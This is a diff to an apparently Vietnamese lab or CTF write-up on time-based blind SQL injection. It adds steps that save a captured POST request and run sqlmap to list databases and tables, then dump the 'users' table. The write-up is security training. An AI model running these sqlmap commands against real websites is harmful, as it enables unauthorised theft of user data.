@@ -44,8 +44,21 @@ Bài này sử dụng phương thức POST để truyền truy vấn nên ta s�
 
 ![image](https://user-images.githubusercontent.com/115911041/234178081-235ce51f-1136-41e7-83c6-e7e1a19e8361.png)
 
-Trước hết copy phần request lưu vào 1 file, ở đây là file bind.txt. Sau đó mở sqlmap lên, tại đây là sử dụng options -r để đọc file. Gõ lệnh:
-`python sqlmap.py -r (địa chỉ file blind.txt) --dbs`
+Trước hết copy phần request lưu vào 1 file, ở đây là file bind.txt. Sau đó mở sqlmap lên, tại đây là sử dụng `options -r` để đọc file. Nhớ cd vào file `sqlmap-dev` mới sử dụng được nhaaaa. Gõ lệnh:
+
+`python3 sqlmap.py -r Blind.txt --dbs`
+
+![image](https://user-images.githubusercontent.com/115911041/234183697-a8766aa4-da42-4672-8486-f1df3bff66f1.png)
+
+Kết quả trả về cho ta thấy trang web bị lỗi time-based blind SQL injection. Không có database trả về, tuy nhiên nó gợi ý cho chúng ta khai thác luôn tên bảng. Ta gõ lệnh:
+
+`python sqlmap.py -r Blind.txt --tables`
+
+![image](https://user-images.githubusercontent.com/115911041/234186948-79de7789-1496-4ca9-b78c-67e5099e6117.png)
+
+Kết quả trả về 1 bảng là users. Ta thực hiện dump toàn bộ dữ liệu trong bảng ra
+
+`python sqlmap.py -r Blind.txt -T users --dump`
 
 
 
